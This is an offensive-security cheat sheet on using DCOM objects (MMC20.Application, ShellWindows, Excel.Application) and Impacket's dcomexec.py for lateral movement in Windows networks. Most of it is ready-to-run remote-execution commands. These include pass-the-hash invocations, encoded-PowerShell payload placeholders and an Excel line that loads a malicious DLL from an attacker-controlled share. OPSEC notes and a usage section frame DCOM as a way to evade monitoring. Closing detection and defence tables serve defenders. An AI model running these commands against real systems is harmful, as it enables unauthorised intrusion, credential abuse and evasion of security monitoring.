# DCOM Lateral Movement

Distributed Component Object Model (DCOM) allows software components to communicate across a network. Attackers abuse DCOM objects (MMC20.Application, ShellWindows, Excel.Application) to execute code on remote machines without creating services or writing binaries to disk.

## How DCOM Works

1. DCOM extends COM to allow communication between components on different machines
2. Client obtains a COM interface pointer to a remote object
3. Client invokes methods on the remote object as if it were local
4. DCOM uses RPC (port 135) for initial connection, then dynamic ports for the object
5. Execution occurs in-process on the remote machine

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local administrator on target |
| RPC (DCOM) | Port 135 open (endpoint mapper) |
| Dynamic RPC | Ports 49152-65535 (Windows Vista+) or 1024-5000 (legacy) |
| Firewall | DCOM must be allowed (Windows Firewall typically blocks by default) |
| Authentication | NTLM or Kerberos |
| UAC | Remote UAC filtering blocks local admin tokens (Administrators group) |

## DCOM Objects for Lateral Movement

### MMC20.Application (Most reliable)

MMC (Microsoft Management Console) exposes the `MMC20.Application` object. The `Document.ActiveView.ExecuteShellCommand` method executes arbitrary shell commands.

```powershell
# PowerShell instantiation (from compromised Windows host)
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "Minimized")

# With command output
$mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\out.txt", "Minimized")

# PowerShell one-liner
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target")).Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -enc BASE64", "Minimized")
```

**OPSEC**: MMC20.Application execution runs under `mmc.exe` on the target. Event 4688 shows `mmc.exe` spawning `cmd.exe`.

### ShellWindows / ShellBrowserWindow

Uses the Internet Explorer COM object (`ShellWindows`). Requires Internet Explorer to be installed (Windows default).

```powershell
# ShellWindows
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "10.10.10.10"))
$shell.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "", "open", 1)

# ShellBrowserWindow
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10"))
$shell.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "", "open", 1)
```

**OPSEC**: ShellWindows/ShellBrowserWindow runs under `explorer.exe` or `iexplore.exe` depending on context. More likely to blend in but less reliable (IE dependency).

### Excel.Application DCOM

Requires Microsoft Excel installed on the target. Uses DDE or XLM macros.

```powershell
# Excel.Application via DDE
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "10.10.10.10"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c calc.exe")

# Excel via RegisterXLL (DLL execution)
$excel.RegisterXLL("\\attacker\share\malicious.dll")

# Excel via ExecuteExcel4Macro
$excel.ExecuteExcel4Macro("CALL(""user32"",""GetDesktopWindow"",""J"")")
```

**OPSEC**: Excel.Application runs under `EXCEL.EXE`. Triggers Excel security warnings if macro security is high. Requires Excel installed (uncommon on servers).

---

## dcomexec.py (Impacket)

Impacket's `dcomexec.py` automates DCOM lateral movement using various COM objects.

```bash
# Basic shell (MMC20.Application - default)
dcomexec.py DOMAIN/user:'Password123!'@10.10.10.10

# ShellBrowserWindow object
dcomexec.py -object ShellBrowserWindow DOMAIN/user:pass@10.10.10.10

# ShellWindows CLSID (same as ShellBrowserWindow)
dcomexec.py -object ShellWindows DOMAIN/user:pass@10.10.10.10

# MMC20.Application (explicit)
dcomexec.py -object MMC20.Application DOMAIN/user:pass@10.10.10.10

# Single command
dcomexec.py -object MMC DOMAIN/user:pass@10.10.10.10 "whoami"

# Pass-the-hash
dcomexec.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.10

# Pass-the-hash (LM:NTLM)
dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH DOMAIN/user@10.10.10.10

# With Kerberos
dcomexec.py -k -no-pass DOMAIN/user@target.domain.local

# No output (fire and forget)
dcomexec.py -nooutput DOMAIN/user:pass@10.10.10.10 "powershell -enc BASE64"

# Debug output
dcomexec.py -debug DOMAIN/user:pass@10.10.10.10 "whoami"
```

### dcomexec.py objects comparison

| Object | CLSID | Reliability | Notes |
|--------|-------|-------------|-------|
| `MMC20.Application` | `{49B2791A-B1AE-4C90-9B8E-E860BA72F74D}` | High | Most reliable, always available |
| `ShellBrowserWindow` | `{C08AFD90-F2A1-11D1-8455-00A0C91F3880}` | Medium | Requires IE installed |
| `ShellWindows` | `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` | Medium | Same as ShellBrowserWindow |
| `Excel.Application` | `{00024500-0000-0000-C000-000000000046}` | Low | Requires Excel installed |

### dcomexec.py output capture

dcomexec.py (like wmiexec) uses a VBS script to capture stdout/stderr:
```bash
# Default behavior: writes output to %TEMP%\*.vbs on target
# Files are cleaned up after execution

# To avoid VBS file evidence:
dcomexec.py -nooutput DOMAIN/user:pass@target "command"
# No output capture; command runs silently
```

---

## DCOM vs WMI vs SMB Comparison

| Feature | DCOM | WMI (wmiexec) | SMB (smbexec/psexec) |
|---------|------|---------------|----------------------|
| Port | 135 + dynamic RPC | 135 + dynamic RPC | 445 |
| Process creation | COM object method | Win32_Process.Create | Service (svcctl) |
| File write | No | VBS script (optionally) | Service binary + output file |
| Event 4697 (service) | No | No | Yes |
| Event 4688 parent | mmc.exe / explorer.exe | wmiprvse.exe | services.exe |
| VBS file evidence | No | Yes (default) | No |
| Binary on disk | No | No | Yes (psexec) |
| Stealth | High | Medium | Low |
| Reliability | Medium (DCOM must be enabled) | High | High |
| Interactive shell | Yes (dcomexec) | Yes (wmiexec) | Yes (smbexec) |
| Windows default FW | Blocks DCOM | Blocks WMI (DCOM) | Allows SMB |

---

## DCOM Execution From Linux (via impacket)

```bash
# Using dcomexec.py with MMC object (most reliable)
dcomexec.py -object MMC DOMAIN/user:pass@10.10.10.10

# ShellBrowserWindow (when MMC fails)
dcomexec.py -object ShellBrowserWindow DOMAIN/user:pass@10.10.10.10

# Execute single command and exit
dcomexec.py -object MMC DOMAIN/user:pass@10.10.10.10 "ipconfig"

# Pass-the-hash variant
dcomexec.py -hashes :NTLM DOMAIN/admin@10.10.10.10
```

---

## Manual DCOM Testing (Windows)

```powershell
# Test if DCOM is accessible on remote machine
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Test command execution
$com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-c whoami > C:\Users\Public\whoami.txt", "Minimized")

# Check if DCOM port is accessible
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4688 | Security | Process creation (parent process is mmc.exe or explorer.exe) |
| 4624 | Security | LogonType 3 (Network logon from DCOM) |
| 4672 | Security | Admin logon (admin required for DCOM) |
| 4648 | Security | Explicit credential logon |
| 5156 | Security | WFP connection to 135 (endpoint mapper) |
| 5158 | Security | WFP bind to dynamic RPC port |
| 1006 | System | DCOM error (if DCOM not enabled on target) |

**Detection logic:**
- `mmc.exe` as parent of `cmd.exe` or `powershell.exe` = DCOM MMC20.Application
- `explorer.exe` as parent spawning shell = DCOM ShellBrowserWindow/ShellWindows
- `EXCEL.EXE` as parent spawning shell = DCOM Excel.Application
- Network connection from `mmc.exe` or `explorer.exe` to remote 135 = DCOM lateral movement
- DCOM connections to systems where source process is unexpected (mmc.exe to server)
- Multiple DCOM connections across targets = automated DCOM movement

## Defenses

| Control | Detail |
|---------|--------|
| Block DCOM | Disable DCOM via firewall: block port 135 inbound |
| DCOM security | Set DCOM authentication level to `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` |
| Remove DCOM | `dcomcnfg.exe` → Component Services → disable remote creation |
| Restrict MMC | Remove MMC20.Application via CLSID restrictions |
| AppLocker/WDAC | Block mmc.exe, explorer.exe spawning cmd/powershell |
| Network segmentation | Block RPC between workload tiers |
| Disable DCOM remotely | GPO: `Computer Config > Admin Templates > Windows Components > Application Compatibility > Turn off DCOM` |
| EDR | Monitor parent-child process anomalies |

## When to Use DCOM

- WMI and SMB execution logged/monitored (DCOM uses different parent process)
- Service creation (4697) would raise alarms (DCOM doesn't create services)
- Need stealthier alternative to PsExec
- Testing DCOM-specific attack surface
- Excel.Application available on target workstations
- Interactive shell needed without SMB service creation

## When NOT to Use DCOM

- DCOM is blocked by Windows Firewall (default for non-domain profiles)
- Target doesn't have DCOM enabled (rare on Windows)
- Reliability needed (WMI is more reliable than DCOM)
- Macros/Office security blocks Excel.Application
- ShellBrowserWindow fails without IE installed (Server Core, LTSC)

## References

- Impacket dcomexec.py: https://github.com/fortra/impacket
- DCOM Lateral Movement (enigma0x3): https://enigma0x3.net/2017/01/23/lateral-movement-via-mmc20-application-com-object/
- DCOM ShellWindows: https://enigma0x3.net/2017/01/23/lateral-movement-via-shellbrowserwindow-object/
- DCOM Excel: https://enigma0x3.net/2017/02/08/lateral-movement-via-excel-application/
- Microsoft DCOM docs: https://learn.microsoft.com/en-us/windows/win32/com/dcom
